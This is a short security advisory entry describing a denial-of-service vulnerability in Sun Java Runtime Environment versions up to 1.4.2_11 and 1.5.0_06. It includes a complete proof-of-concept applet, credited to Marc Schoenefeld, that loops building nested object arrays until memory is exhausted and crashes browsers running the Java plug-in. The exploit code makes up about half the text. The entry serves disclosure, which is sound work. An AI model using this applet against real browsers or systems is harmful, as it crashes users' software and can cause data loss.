source: http://www.securityfocus.com/bid/18058/info

The Sun Java Runtime Environment is vulnerable to a denial-of-service vulnerability. This issue is due to the software's failure to handle exceptional conditions. 

This issue is reported to affect Java Runtime Environment versions up to 1.4.2_11 and 1.5.0_06. This issue will crash Internet browsers running an affected Java plug-in. 

An attacker may exploit this issue to cause a vulnerable application -- as well as all processes spawned from the application -- to crash, denying service to legitimate users. Due to the scope of the crash, data loss may occur.

public class MemApplet extends java.applet.Applet{ 
/* (c) Marc Schoenefeld */ 
static Object o = null; 
public static void main(String[] args) { 
(new MemApplet()).doit(); 
} 
public void paint(java.awt.Graphics p) { 
(new MemApplet()).doit(); } 
void doit () { 
while (true) try { Object[] oarr = {o}; o = oarr; } catch (Throwable t) { o = null; System.out.println("Wurfgeschoss: " + t); } } }